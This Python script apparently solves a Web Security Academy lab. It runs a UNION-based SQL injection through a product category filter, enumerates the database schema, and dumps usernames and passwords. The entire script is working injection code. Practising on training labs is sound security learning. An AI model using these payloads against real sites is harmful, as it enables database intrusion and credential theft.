import requests
import re
from bs4 import BeautifulSoup

s = requests.Session()

site = 'acb11ff51e68c755c01a3729005f00b2.web-security-academy.net'
url = f'https://{site}'

resp = s.get(url)

def try_category(category_string):
    url = f'https://{site}/filter?category={category_string}'
    resp = s.get(url)
    soup = BeautifulSoup(resp.text,'html.parser')
    print(soup)

    user_table = soup.find('table').find('th',text=re.compile('^users')).text
    print(f"Found user table of {user_table}")
    return user_table

user_table = try_category("""Accessories' UNION SELECT table_name,null FROM information_schema.tables -- """)
category_string = f"""Accessories' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='{user_table}' --"""
url = f'https://{site}/filter?category={category_string}'
resp = s.get(url)


soup = BeautifulSoup(resp.text,'html.parser')
# print(resp.text)
username_col = soup.find('table').find('th',text=re.compile('^username')).text
password_col = soup.find('table').find('th',text=re.compile('^password')).text
print(f"Found username column of {username_col}")
print(f"Found password column of {password_col}")

category_string = f"""Accessories' UNION SELECT {username_col},{password_col} from {user_table} --"""
url = f'https://{site}/filter?category={category_string}'
resp = s.get(url)
soup = BeautifulSoup(resp.text,'html.parser')
print(resp.text)
